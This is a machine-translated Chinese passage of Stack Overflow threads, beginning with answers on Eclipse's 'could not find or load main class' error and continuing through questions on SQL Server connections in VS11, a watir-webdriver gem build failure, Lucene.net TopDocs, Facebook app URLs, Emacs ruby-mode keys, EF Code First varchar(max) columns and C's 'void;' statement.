> 
> 时间：2013-01-25T15:03:56.523

我遇到了同样的问题，但在我的情况下，它是由丢失（空）源文件夹引起的（它存在于原始项目中，但不存在于 GIT 存储库中，因为它是空的）。

创建丢失的文件夹后，一切正常。

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2013-03-12T19:28:13.443

在移动一些资源之后，我也收到了这个错误。检查错误日志，我看到 Eclipse 无法构建，因为它无法删除文件/文件夹。尝试手动删除“bin”（或为您调用的任何内容）文件夹。

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2014-02-12T10:49:51.237

我今天遇到了这个错误，因为我设置了一个 hello world 程序，然后将一个新程序剪切并粘贴到同一个文件中。为了解决上次调用时找不到 hello world 的问题，我单击了运行-> 运行配置，然后在主类下单击搜索，它找到了我的新类名并将其替换为我粘贴的文本中的正确新名称. 这是我知道的新手问题，但也很容易解决。我希望这可以帮助别人！道格拉斯

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2014-06-26T11:25:58.750

大多数情况下会发生这种情况，因为 Eclipse 会清理`.class`文件，但不会再次构建它们。检查`bin`文件夹，它应该是空的。然后你应该检查一下，是否还有其他导致构建失败的原因。您可能在类路径中添加了一些 jar，Eclipse 可能无法找到这些 jar。

* * *

## 回答 #24

> 赞同：2
> 
> 时间：2015-01-13T16:08:39.793

只需转到您的包资源管理器并按 F5，或者对于某些笔记本电脑 fn+F5。原因是eclipse认为文件在某处，但文件实际上在其他地方。通过刷新它，您可以将它们放在同一页面上。不用担心，您不会丢失任何东西，但如果您想格外小心，只需将文件从您的 java 项目文件夹备份到安全的地方。

* * *

## 回答 #25

> 赞同：2
> 
> 时间：2015-05-20T09:48:54.290

这些是简单的步骤，帮助我解决了这个问题。

1.  关闭日食
2.  删除工作空间中的“.metadata”文件夹。（可能是隐藏文件夹）
3.  打开eclipse（它会自动在你的工作区创建“.metadata”文件夹）
4.  尝试运行程序。

* * *

## 回答 #26

> 赞同：2
> 
> 时间：2015-07-29T21:33:32.973

当我通过右键单击它并点击“删除”（而不是从“构建路径”）从 Eclipse 项目中删除“.jar”文件时，我出现了这个问题。

为了解决，我尝试了以下步骤：

> 1-右键单击项目
> 
> 2-构建路径->配置构建路径
> 
> 3- 图书馆
> 
> 4- 从那里删除 jar 文件（我看到它旁边有一个红色标记）。

* * *

## 回答 #27

> 赞同：2
> 
> 时间：2018-06-03T19:46:48.733

检查工作区错误日志（Windows-> 显示视图-> 错误日志）。如果您看到任何导入的 jar 文件已损坏，请删除相应的存储库文件夹并再次重新导入。

* * *

## 回答 #28

> 赞同：2
> 
> 时间：2018-06-08T06:01:04.357

2 种类型的解决方案存在相同的情况。

(1) 进入运行配置： - run->run configurations 在 Classpath 选项卡中：

选择 Advanced Add where Eclipse 通常将项目的 *.class 放在 bin 中。所以我为项目添加了bin目录。

（2）如果第一个解决方案不起作用，那么这意味着您指向项目的 jar 正在使用您的本地 Maven 存储库的路径，该路径没有更新到您的项目，所以最好从该本地 maven 存储库检查 jar 和将其复制粘贴到新项目中，或者只是从任何站点下载并将其配置到您的构建路径中。

我希望它有所帮助。

* * *

## 回答 #29

> 赞同：1
> 
> 时间：2013-10-09T08:50:34.697

我有同样的问题。花了几个小时，终于将我的工作区改回本地文件夹，现在一切正常。

* * *

## 回答 #30

> 赞同：1
> 
> 时间：2014-08-14T11:30:42.720

无论我将 JAVA_HOME 设置为什么，在第一次遇到 Windows 8 拒绝更新我的路径的问题后，我都遇到了这个问题 - java -version 报告了最后一个 JDK，而不是我存储在 JAVA_HOME 中的那个。我终于通过输入 '%JAVA_HOME%/bin;' 来实现它 在路径环境变量的前面而不是末尾。然后我启动了 Eclipse，但在此之前它运行良好时突然找不到我的主类。我所做的修复它是进入项目属性，从库选项卡中删除现有的 JRE 库，通过选择“添加库”按钮添加新的 JRE，然后按照提示安装 JRE 7 作为我的默认 JRE。现在一切都恢复了工作。

* * *

## 回答 #31

> 赞同：1
> 
> 时间：2014-10-16T15:49:35.613

我在我的情况下找到了其他解决方案这个问题：`Eclipse->Preferences->Java->Installed JRE`然后按下按钮搜索。在 Linux 中选择文件夹，`/usr`然后 Eclipse 找到所有 JVM。

**选择另一个 JVM too current**。它解决了我的情况。

* * *

## 回答 #32

> 赞同：1
> 
> 时间：2015-03-27T03:15:59.030

在我的项目中创建新包（“表”）后，我遇到了同样的问题。

我去了`Window -> Show View -> General -> Error Log`，我读过错误：

```
JavaBuilder handling ImageBuilderInternalException while building: PizzaService

org.eclipse.core.internal.resources.ResourceException: Resource '/PizzaService/bin/tables' already exists. 
```

事实证明，我在另一个源文件夹中有一个与这个新包同名的文本文件。所以我已经将文本文件名从“Tables”更改为“Tabless”，我可以再次运行我的项目。

希望这可以帮助。

* * *

## 回答 #33

> 赞同：1
> 
> 时间：2015-04-10T11:35:28.003

我遇到了同样的错误，错误出现在一个导入的外部 jar 中。删除该 jar 项目后对我有用。

* * *

## 回答 #34

> 赞同：1
> 
> 时间：2015-04-13T20:13:40.673

当我将安装的 JRE 更改为 JDK7 而不是 JRE7 时发生在我身上。一切都编译了，但我无法从 Eclipse“eclipse-error-could-not-find-or-load-main-class”运行任何东西

使固定; 回到以前的 JRE7。

* * *

## 回答 #35

> 赞同：1
> 
> 时间：2015-04-23T18:06:59.787

使用 Ctrl+Shift+R (Windows) 重命名类，它将在所引用的任何地方更改类的名称，然后执行相反的过程。在我的情况下，它是由环境中的几个项目中的相同类名引起的，Eclipse 很难理解哪个是哪个。

* * *

## 回答 #36

> 赞同：1
> 
> 时间：2015-05-01T04:53:25.763

遵循对我有用的步骤：

1.  从 Eclipse 中删除配置构建路径（构建路径）
2.  刷新
3.  添加configure Build Path->Source->add Folder->check src ok。

* * *

## 回答 #37

> 赞同：1
> 
> 时间：2015-07-22T00:31:14.260

我对 Eclipse-Mars 也有同样的问题。我有一个工作项目，然后把它放在我的 Git 存储库中。这破坏了执行（我猜是因为实际的 Java 文件已移动到 git 位置并且不再存在于我的工作区中）。我做了一个 Maven>Update，它现在可以工作了。

* * *

## 回答 #38

> 赞同：1
> 
> 时间：2015-08-25T20:40:15.363

`.jar`实际上，我通过手动逐个添加每个文件找到了此问题的真正根本原因，因为[同一线程中的以下答案](https://stackoverflow.com/a/27488594/1752988)建议您这样做。

**原因：**
你知道我们是人类，我们真的很懒惰，这就是为什么我们有一个“全选”选项以及执行该选项的快捷键。因此，当我必须为 PDF 生成所需的应用程序添加大约 30 多个 jar 文件时，我确实采用了这种方式，

> **右键单击项目**->**属性**-> **Java 构建路径**

*   在其中选择“库”选项卡，然后**添加 JAR...”**，浏览目录树和（我的 JAR 和 licence.txt 文件位于项目“lib”文件夹中）在“lib”文件夹中，**我选择了所有文件和添加。**你能猜出哪里出了**问题**吗？它已经成功地添加了“lib”文件夹中的所有文件。但是 eclipse 一直试图以这种方式将你可能添加的任何文本文件作为 JAR 文件。所以它不能建立链接。就是这种情况。

**所以你有两个选择：**

1.  在任何地方只选择 JAR 文件，不要懒于添加文本和其他类型的文件。**或者，**

2.  选择要从中添加 JAR 的特定文件夹中的所有文件，然后一一删除，即非 JAR 文件。

**注意：** 如果您在尝试添加“库”时以这种方式将任何非 JAR 文件添加到项目中，它将显示如下内容：

[![在此处输入图像描述](../Images/cb92cbecab7c008125280edb8ae676da.png)](https://i.stack.imgur.com/NKjjJ.png)

并继续尝试编译，最后，它会给你以下错误：

> 错误：无法找到或加载主类 er.waterapp.some.MainFileGivenByConfiguration

*   **MainFileGivenByConfigaration**可以是您可能从 Configuration 中选择的任何类，以作为应用程序的起点。

* * *

## 回答 #39

> 赞同：1
> 
> 时间：2017-12-11T10:03:26.370

我花了十分之一小时试图解决这个问题，最后唯一帮助我的是注意到我的包中有一些同名的文件（文本文件），比如 TODO、README 和 IMPORTANT。我检查了项目的每个包，重命名了这些文件（如 TODO_packagename1、TODO_packagename2...），完成后，我关闭了 Eclipse 并再次重新启动它。然后工作了！

* * *

## 回答 #40

> 赞同：1
> 
> 时间：2018-11-01T14:35:46.677

我正在使用日食氧气，问题每次都存在。后来我发现如果你的 Eclipse 工作区位于非 ascii 字符的目录下，那么 javaw.exe 就无法到达 bin 目录。假设您的目录名称是 Work_Hello 删除下划线符号并清理项目并运行配置。这对我有用。参考：[https ://www.eclipse.org/forums/index.php/t/1093209/](https://www.eclipse.org/forums/index.php/t/1093209/)

* * *

## 回答 #41

> 赞同：1
> 
> 时间：2019-10-03T10:24:33.517

在构建路径中使用自定义存档的项目文件，修复 -> 进入类路径文件，找到并删除条目，然后收集存档的新副本并将其再次添加到构建路径。您需要重建项目并在之后检查“运行配置”。

* * *

## 回答 #42

> 赞同：1
> 
> 时间：2020-07-21T18:29:31.547

使用命令行重建已多次为我解决了此问题。例如，运行`ant build`（对于 Ant 项目）或`mvn build`（对于 Maven 项目）将在 eclipse 成功后修复。

* * *

## 回答 #43

> 赞同：1
> 
> 时间：2020-10-02T10:52:16.987

在您的 Eclipse Preferences -> java -> Installed JREs -> 选择您机器上的 Java SE jdk 并添加 JDK

* * *

## 回答 #44

> 赞同：1
> 
> 时间：2020-10-02T14:15:39.930

检查您是否包含任何缺少的依赖项。就我而言，我已经导入了 json jar（该路径中不再存在）。从库中删除它有帮助。

[![图书馆](../Images/d1a475a3577a12cf14e47da65e1b3630.png)](https://i.stack.imgur.com/smVlJ.png)

导航到库（右键单击项目-> 属性）。

* * *

## 回答 #45

> 赞同：0
> 
> 时间：2014-07-20T18:24:30.340

在更改配置或重新安装之前尝试重命名包。
我得到了这个奇怪的错误，除了几行代码之外没有改变任何东西。重建不起作用，即使 bin 文件夹为空，Eclipse 也不会重新创建该类。在将包从 test 重命名为 test1 之后，Eclipse 开始重建，一切都很好。

* * *

## 回答 #46

> 赞同：0
> 
> 时间：2016-08-28T19:16:50.633

我最终做的是在 Eclipse 中，复制整个项目并再次粘贴（当然还要给它一个不同的名称）。然后运行您复制的项目。它应该询问您是否希望它作为 Java Applet 或 Java 应用程序运行。单击 Java 应用程序，它应该再次工作。然后，如果您愿意，您可以删除原始项目并将当前项目重命名为其原始名称。

* * *

## 回答 #47

> 赞同：0
> 
> 时间：2018-11-15T14:33:14.657

我对这个错误有一个非常奇怪的原因。本地 Maven 存储库 (~/.m2/...) 中引用的一些文件已损坏。删除这些然后重建应用程序后，它工作了。使用较新版本的 Maven 会暴露损坏的文件。

* * *

## 回答 #48

> 赞同：0
> 
> 时间：2018-12-10T16:41:05.983

我在我的小型 Java 代码片段中遇到了类似的问题

这就是我所做的。

1.  我复制了 Main 类中的所有内容。

2.  删除了主类 Greeter。

3.  右键单击 -> 创建一个名为 Greeter 的新 Java 类

    a> 创建类时检查包含主要方法

4.  瞧！通过右键单击主类 Greeter.java，我能够作为 Java 应用程序运行。

出于好奇，我再次尝试删除 Greeter 类并在不检查 main 方法的情况下创建新类，但它没有显示我在右键单击时作为 Java 应用程序选项运行。

* * *

## 回答 #49

> 赞同：0
> 
> 时间：2019-11-14T17:02:04.260

我今天也遇到了这个问题。无论我使用 main 方法创建什么新类，我都面临同样的问题。然后我检查了构建路径，发现其中一个 java api jar 文件 - nashorn 显示为丢失。我把它放回 ext 文件夹，它工作了！

* * *

## 回答 #50

> 赞同：0
> 
> 时间：2019-12-10T06:25:55.400

有时，它可能有一个非常简单的解决方案

您可能添加了现有 .jar 文件的新版本，而忘记删除同一 .jar 文件的旧版本。

现在尝试在 Build Path > Configure Build Path 中删除旧的 jar 文件（标记为红色）

* * *

## 回答 #51

> 赞同：0
> 
> 时间：2019-12-11T19:42:30.720

一个非常简单的修复可以是删除 pom.xml 中的注释错误。

我现在不知道为什么，但错误可能会在 pom 中持续存在，即使你评论它。在我的情况下，它是 mockit 或 mockit 的整个依赖项的必要范围标记，所有评论！删除注释行并保存 pom 就足够了。

* * *

## 回答 #52

> 赞同：0
> 
> 时间：2020-07-14T18:23:12.047

我在日食中遇到的同样的错误，最重要的是没有帮助我，所以这里是你可以做的步骤：

1.  检查问题-Windows->显示视图->其他->问题，如果您发现他们的错误说“在项目xxx的构建路径中检测到循环-构建路径问题”。然后做简单的事情：将循环依赖标记为警告：Windows -> Preferences -> Java-> Compiler -> Building -> Circular Dependencies 它将解决您的问题。之后永远不要忘记清理项目：Project->clean

希望这会有所帮助！

* * *

## 回答 #53

> 赞同：0
> 
> 时间：2021-05-28T04:10:33.953

如果您的项目是 Maven 项目，请确保项目的 pom.xml 中没有缺少依赖项。

在 Eclipse 中，如果在 repo 中找不到开头的 ''，则应以红色突出显示 - 删除所有这些依赖项（或修复它们）。

删除所有缺少的依赖项后，您应该能够运行该类。

* * *

## 回答 #54

> 赞同：0
> 
> 时间：2021-10-11T02:35:11.090

我今天遇到了这个错误，并浏览了所有现有的答案。然而，他们都没有工作。

我的解决方案是：**创建新的 Eclipse Workspace**并导入旧项目。这次项目开始得很好。

我不知道为什么它解决了这个问题。我的猜测是在删除并重新创建具有相同名称的项目后发生这种情况会导致 Eclipse 出现一些问题。

* * *

## 回答 #55

> 赞同：0
> 
> 时间：2021-10-24T19:39:07.000

我通过删除 Eclipse / Spring Tools Suite 中的项目解决了这个问题（不删除源代码！）。然后进入我的项目所在的目录并删除该`.settings`目录以及与 Eclipse 相关的任何内容，然后我重新导入 Gradle 项目并解决了问题。

这发生在我将入口点文件移动到 Spring Boot 应用程序之后。

* * *

## 回答 #56

> 赞同：0
> 
> 时间：2021-12-18T08:40:57.673

我有一段时间没有在我的 Gradle 项目上工作了，我得到了这个错误。我右键单击项目 -> Gradle -> 刷新 Gradle 项目。这对我有用。

* * *

## 回答 #57

> 赞同：0
> 
> 时间：2022-02-27T10:09:02.447

对我来说，从 git 导入 maven 项目后，我遇到了同样的问题。在 Eclipse 中使用以下步骤在构建路径中使用新的 JRE 后，它得到了解决。

Eclipse项目属性->Java构建路径->库->JRE->编辑->执行环境->JavaSE-17->完成，然后使用Run->maven安装重建。这次没有看到错误

* * *

## 回答 #58

> 赞同：0
> 
> 时间：2022-02-27T10:32:48.600

在将 eclipse 项目从一台计算机迁移到另一台计算机之后，当右键单击 MyProject->Refresh 没有成功时，以下内容对我有用。

Project Explorer->MyProject->Build Path->Configure Build Path->Java Compiler：勾选 Enable project specific settings 并选择 Apply。

这将重建 MyProject/build 目录中的所有类文件。

# sql-server - 如何将 SQL Server 数据库添加到我的 VS11 网站？

> ID：11235828
> 
> 赞同：1
> 
> 时间：2012-06-27T22:45:35.800
> 
> 标签：sql-server, asp.net-mvc-3, visual-studio

我在 Visual Studio 11（测试版）中打开了一个网站项目（C#/ASP.NET），它与内置的 SQL Server Compact Edition 一起使用。但是，我宁愿使用安装在这台机器上的 SQL Server 2012，并且我已经在其中创建了我的表。

问题是，如何从 VS11 连接到它？我是否将其添加到`App_Data`我拥有 Compact 数据库的文件夹中？

现在我正在打开我的预制数据库

```
var db = Database.Open("StarterSite"); 
```

命令。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T05:22:55.467

如果您已经在 SQL Server 2012 上创建了数据库，那么就使用它吧！

无需*将其添加*到您的项目中（并且绝对不要将其复制到`App_Data`！）。

只需在您的`web.config`类似内容中创建一个连接字符串：

```
<connectionStrings>
   <add name="YourConnectionStringNameHere"
        connectionString="server=(local);database=YourDatabase;Integrated Security=SSPI;" />
</connectionStrings> 
```

然后在您的应用程序中使用所有普通的 ADO.NET 组件，如`SqlConnection`or `SqlCommand`：

```
string connectionString = WebConfigurationManager.ConnectionStrings["YourConnectionStringNameHere"].ConnectionString;

using (SqlConnection conn = new SqlConnection(connectionString))
using (SqlCommand cmd = new SqlCommand("your-sql-statement-here", conn))    
{
   // do work in your database here....
} 
```

或者使用实体框架之类的东西让你的生活更轻松！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:55:09.123

这将取决于您希望用于连接到 SQL 服务器数据库的技术。我更喜欢在 web.config 中设置我的连接字符串，并在连接到我的数据库时使用它。您可能想探索几个选项。这是一篇很好的 MSDN 文章，解释了一些技术。

[在 ASP.NET 中连接到数据库](http://msdn.microsoft.com/en-us/library/ms178371.aspx)

# watir-webdriver - 安装 Watir-webdriver 总是失败

> ID：11235831
> 
> 赞同：3
> 
> 时间：2012-06-27T22:46:11.067
> 
> 标签：watir-webdriver

我的

```
$ sudo gem install watir-webdriver --no-ri --no-rdoc 
```

总是失败并出现以下错误

（我正在运行 Fedora 17、64 位，并安装了 ruby​​-devel）

```
------------------------
Building native extensions.  This could take a while...
...........
ERROR:  Error installing watir-webdriver:
    ERROR: Failed to build gem native extension.

        /usr/bin/ruby extconf.rb
checking for ffi.h... *** extconf.rb failed ***
Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options.

Provided configuration options:
    --with-opt-dir
    --without-opt-dir
    --with-opt-include
    --without-opt-include=${opt-dir}/include
    --with-opt-lib
    --without-opt-lib=${opt-dir}/lib
    --with-make-prog
    --without-make-prog
    --srcdir=.
    --curdir
    --ruby=/usr/bin/ruby
    --with-ffi_c-dir
    --without-ffi_c-dir
    --with-ffi_c-include
    --without-ffi_c-include=${ffi_c-dir}/include
    --with-ffi_c-lib
    --without-ffi_c-lib=${ffi_c-dir}/lib
    --with-libffi-config
    --without-libffi-config
    --with-pkg-config
    --without-pkg-config
/usr/share/ruby/mkmf.rb:381:in `try_do': The compiler failed to generate an executable file. (RuntimeError)
You have to install development tools first.
    from /usr/share/ruby/mkmf.rb:506:in `try_cpp'
    from /usr/share/ruby/mkmf.rb:931:in `block in have_header'
    from /usr/share/ruby/mkmf.rb:790:in `block in checking_for'
    from /usr/share/ruby/mkmf.rb:284:in `block (2 levels) in postpone'
    from /usr/share/ruby/mkmf.rb:254:in `open'
    from /usr/share/ruby/mkmf.rb:284:in `block in postpone'
    from /usr/share/ruby/mkmf.rb:254:in `open'
    from /usr/share/ruby/mkmf.rb:280:in `postpone'
    from /usr/share/ruby/mkmf.rb:789:in `checking_for'
    from /usr/share/ruby/mkmf.rb:930:in `have_header'
    from extconf.rb:9:in `<main>'

Gem files will remain installed in /usr/local/share/gems/gems/ffi-1.0.11 for inspection.
Results logged to /usr/local/share/gems/gems/ffi-1.0.11/ext/ffi_c/gem_make.out 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-10-24T03:13:08.937

请参考： [https ://github.com/Compass/compass/issues/1854](https://github.com/Compass/compass/issues/1854)

abhi7 于 2014 年 10 月 21 日发表评论

abhi7 的解决方案适用于我的情况

xcode-选择--安装

须藤宝石更新--系统

# c# - Lucene.net - TopDocs 缺少 totalHits？

> ID：11235835
> 
> 赞同：0
> 
> 时间：2012-06-27T22:46:30.193
> 
> 标签：c#, asp.net, vb.net, lucene, lucene.net

我使用 NuGet 包管理器下载了 Lucene.net 2.9.4.1 并使用以下代码创建了一个测试索引：

```
Dim sysDir As New System.IO.DirectoryInfo(Server.MapPath("~/index"))
Dim indexDir As Store.Directory = Store.FSDirectory.Open(sysDir)
Dim analyzer As Analysis.Analyzer = New Analysis.Standard.StandardAnalyzer(Util.Version.LUCENE_29)
Dim indexWriter As Index.IndexWriter = New Index.IndexWriter(indexDir, analyzer, True, Index.IndexWriter.MaxFieldLength.UNLIMITED)

Dim doc As Documents.Document = New Documents.Document()
Dim fldContent As Documents.Field = New Documents.Field("content", "The quick brown fox jumps over the lazy dog", Documents.Field.Store.YES, Documents.Field.Index.ANALYZED, Documents.Field.TermVector.YES)
doc.Add(fldContent)

indexWriter.AddDocument(doc)
indexWriter.Optimize()

indexWriter.Close()
indexDir.Close() 
```

接下来，当我开始编写执行搜索的代码时，我无法访问 TopDocs 类的 totalHits 属性。这是代码：

```
Dim sysDir As New System.IO.DirectoryInfo(Server.MapPath("~/index"))
Dim indexDir As Store.Directory = Store.FSDirectory.Open(sysDir)
Dim searcher As Search.IndexSearcher = New Search.IndexSearcher(indexDir, True)

Dim searchTerm As Index.Term = New Index.Term("content", "fox")
Dim query As Search.Query = New Search.TermQuery(searchTerm)
Dim tdocs As Search.TopDocs = searcher.Search(query, Nothing, 100) 
```

当我在下一行键入“tdocs”后跟一个点时，我只能访问 GetMaxScore 和 SetMaxScore 方法以及 MaxScore 属性 - 我看不到任何显示“totalHits”的属性。

我错过了什么吗？有没有人有一些示例代码，他们使用 Lucene.net.Search.TopDocs 而不是 Lucene.net.Search.Hits（据说已经过时）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T18:40:55.247

那是因为您使用的是 VB，目前 Lucene 不符合 CLS。

我**认为**这与将在下一个版本中修复的错误有关。 [https://issues.apache.org/jira/browse/LUCENENET-476](https://issues.apache.org/jira/browse/LUCENENET-476)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T10:15:06.693

这是示例 C# 代码：

```
TopDocs topDocs = searcher.Search(query, luceneHitsLimit);
if (topDocs != null) {
    int totalResults = topDocs.totalHits;
    ScoreDoc[] scoreDocs = topDocs.scoreDocs;
    foreach(ScoreDoc scoreDoc in scoreDocs) {
        Document doc = searcher.Doc(scoreDoc.doc);
        ...
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T19:23:22.937

*我知道这可能有点晚了，但希望它可以帮助您或将来的其他人。*

为了解决 2.9.4 中的问题，我在 TopDocs 类中编辑了源代码。它不起作用的原因是 VB 不区分大小写，而 C# 是（众所周知）。

TopDocs 类有一个 totalHits int 属性和一个 TotalHits int 属性。查看代码后，我意识到 TotalHits 属性只是获取/设置 totalHits 变量。所以我只是在类中将 totalHits 变量的名称更改为 totalHits_obsolete，然后重建库。

构建完成后，我的另一个项目就能够从我的 VB.Net 代码访问 TotalHits 属性。

# javascript - 授权的 facebook 应用程序中的应用程序、页面选项卡和独立网站的 URL 相同吗？

> ID：11235838
> 
> 赞同：0
> 
> 时间：2012-06-27T22:46:53.000
> 
> 标签：javascript, facebook

我有一个需要授权的 facebook 应用程序，因此我必须将重定向 URL 与身份验证请求一起传递。

我的应用程序完全是前端代码。

如果我不想要独立版本，我可以通过 window.location.href 这样的东西不适用于应用程序页面，因为它是来自不同服务器的 iframe。因此，在这种情况下，我必须对 app-url 进行硬编码。该应用程序旨在嵌入不同的应用程序页面，因此我无法对其进行硬编码。Apperntly 我可以使用 facebook api 获取 facebook page-tab-link 等。不过还没有仔细看细节。[用户身份验证后重定向回页面选项卡？](https://stackoverflow.com/questions/8158657/redirect-back-to-page-tab-after-user-authenticates)

由于 facebook 不允许参数，我的计划是将 /pagetab/ 或 /app/ 添加到我的 url 的末尾，并将其添加到 facebook 设置中的各种 url。之后，我将为不同的 url 结尾创建不同的案例。

虽然这个灵魂听起来像是很多工作。有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T09:02:41.440

如果您的应用程序*不是*完全客户端，那么您可以在`signed_request`参数中找到您的应用程序嵌入哪个页面的信息。但是由于 Facebook 在调用您的应用程序时将其发布到 iframe，因此无法在客户端访问它。

> 由于 facebook 不允许参数

Facebook 允许`app_data`在 URL 中调用一个参数，该参数将传递给您的应用程序。但同样，这在第一页加载时通过 POST 发生。

如果您愿意（并且能够，关于您的平台）对让您的应用程序 HTML 代码由服务器端语言生成（而不是纯粹的静态 HTML 页面）进行一点调整，那么您可以轻松评估`signed_request`参数，并将页面 ID 写入 JavaScript 变量，以便您可以从那里在客户端使用它。

# ruby-on-rails - Emacs wrap-region-trigger 在 ruby 模式下已被 ruby -electric-matching-char 覆盖

> ID：11235840
> 
> 赞同：3
> 
> 时间：2012-06-27T22:46:55.213
> 
> 标签：ruby-on-rails, emacs

Emacs 24、eLisp、Mac OS X Lion

wrap-region-trigger 在 ruby​​ 模式下已被 ruby​​-electric-matching-char 覆盖。我怎样才能防止这种情况发生，或者只是强制 wrap-region-trigger 用于 ruby​​-mode？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T19:30:24.967

您始终可以取消定义`ruby-mode`. 以下是完全未经测试的，因为我已经`ruby-mode`很长时间没有使用了。

```
(define-key ruby-mode-map "[" nil)
(define-key ruby-mode-map "(" nil)
;; etc. 
```

# c# - 如何使用 ASP.net EF Codefirst 数据注释将 SQL Server 中的列设置为 varchar(max)？

> ID：11235847
> 
> 赞同：51
> 
> 时间：2012-06-27T22:48:08.193
> 
> 标签：c#, sql-server, entity-framework, ef-code-first

我一直在网上搜索，试图找出正确的语法，让实体框架代码首先使用列创建我的表：varchar(max)。

这就是我所拥有的。默认情况下，这会创建 varchar(128)。如何创建 varchar(max)？

我试过 [MaxLength] 没有成功。

任何帮助，将不胜感激。谢谢！

```
[Column(TypeName = "varchar")]
public string MediaDesc { get; set; } 
```

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-06-28T08:21:53.517

```
[Column(TypeName = "varchar(MAX)")] 
```

令人惊讶的是，最明显的解决方案有效。

该`[MaxLength]`属性仅创建一个`varchar`最大长度不是 MAX 的列，但在我的情况下（SQL Server Express 2008 R2）为 8000。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-06-28T16:28:04.690

这会让你`nvarchar(max)`：

```
[StringLength(int.MaxValue)] 
```

我认为没有强制非 unicode 的属性（您确定要这样做吗？），因此`varchar(max)`您需要在 DbContext 中进行调整：

```
protected override void OnModelCreating(DbModelBuilder modelBuilder)
{
    modelBuilder.Entity<Entity>().Property(x => x.MediaDesc).IsUnicode(false);
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-28T06:23:31.800

使用 [MaxLength] 注释。

```
[Column(TypeName = "varchar")]
[MaxLength]
public string MediaDesc { get; set; } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-03-16T08:20:03.807

@Slauma 答案的更新。

对所有这样的字符串使用覆盖`OnModelCreating`：

```
modelBuilder.Properties<string>().Configure(s => 
    s.HasMaxLength(256).HasColumnType("nvarchar")); 
```

然后使用如下属性修改属性：

```
[Column(TypeName = "nvarchar(MAX)")]
public string CaseComment { get; set; } 
```

或这个：

```
modelBuilder.Entity<YourClass>()
    .Property(b => b.CaseComment)
    .HasColumnType("nvarchar(MAX)"); 
```

这可能会导致异常。`Validation failed for one or more entities. See 'EntityValidationErrors' property for more details.`即使该列是正确的数据类型实体框架仍然认为它是`nvarchar(256)`并抛出错误`DbEntityValidationException`。

要解决此问题，请改用以下内容：

```
[Column(TypeName = "nvarchar(MAX)")]
[MaxLength]
public string CaseComment { get; set; } 
```

或者

```
modelBuilder.Entity<YourClass>()
    .Property(b => b.CaseComment)
    .HasColumnType("nvarchar(MAX)")
    .HasMaxLength(null); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-14T15:11:13.077

`[Column(TypeName = "varchar(MAX)")]`导致数据库中的 varchar(Max)。如果您有自定义约定将字符串 MaxLength 设置为 100，

```
modelBuilder
    .Properties<string>()
    .Configure(c => c.IsUnicode(false).HasMaxLength(100)); 
```

您需要包含 MaxLength 属性`[Column(TypeName = "varchar(MAX)"), MaxLength]`。如果不这样做，您将在数据库中获得 varchar(MAX) 但验证将抛出超过 100 个字符。

# c - C 中的 void 语句有什么作用？

> ID：11235848
> 
> 赞同：4
> 
> 时间：2012-06-27T22:48:12.923
> 
> 标签：c, syntax, void

在 C中放`void;`一条线有什么作用？编译器对此发出警告，但我不明白。能够在这样的线上放置 void 有什么意义？

```
#include <stdio.h>

int main() {
        void;
        printf("word dude");
        return 1;
} 
```

诶

```
$ gcc -pedantic -ansi -Wall -Wextra eh.c -o eh
eh.c: In function 'main':
eh.c:4:2: warning: useless type name in empty declaration
$ ./eh
word dude 
```

* * *

人们似乎对我在问什么感到困惑：这条线是什么意思，它有什么作用吗？为什么有效？

```
void; 
```

* * *

删除了 void cast，因为它会引起不必要的讨论。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T23:04:48.477

```
 void;                       // 1
      (void)printf("word dude");  // 2 
```

第一个语句是**无效**语句：这不是 C。

在第二个语句中，`(void)`演员表明确了您放弃返回值的意图。另一个常见的用途是使一些静态分析工具（如 Lint）保持沉默。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T05:44:10.957

这个问题引起了我的兴趣，因为我首先想到的是 K&R。我回到我的旧 K&R 书（附录 A p.192）上找到了关于声明的简介（转录）：

```
8\. 声明

声明用于指定 C 对每个标识符的解释；它们不一定保留与标识符关联的存储空间。声明有
表格
    *声明：*
        *decl-specifier declarator-list [opt] **；***

declarator-list 中的声明符包含被声明的标识符。decl 说明符由一系列类型和存储类说明符组成。
    *decl-specifiers:* 
        *type-specifier decl-specifiers [opt]*
        * sc-specifier decl-specifiers [opt]*

```

这让我相信 delarator 列表是可选的（意味着它可以是空的）。

为了在下一页增加这种混乱，它列出了一组合法的*类型说明符*值，而*void*不是其中之一。

在我的狭义解释中，这可能仍然是合法的（但已过时） C.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:48:47.930

```
void; 
```

这样做没有意义，它没有任何作用。

你是从一本书里弄出来的吗？一定是个错误。

有点不相关，返回值 if`0`通常用于表示程序正常终止，任何其他值表示有问题（按约定）

**更新**：

看起来您添加了另一行：

```
(void)printf("word dude"); 
```

这 - 与前面不同`void;`- 明确告诉编译器忽略`printf()`函数的返回值（打印的字符数）并防止警告消息在编译器或其他工具（如 lint）上的挑剔/迂腐设置停止抱怨。

您通常不会在常用功能中看到这一点，尽管您可能会看到其他功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T22:53:24.150

如果您更改`void`为`int`或任何其他类型，它会打印相同的错误。

`void`是一种类型，它期望在该类型之后有一些东西。它根本没有任何意义，因为`int`它后面没有变量（或函数）名称。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-27T22:57:49.637

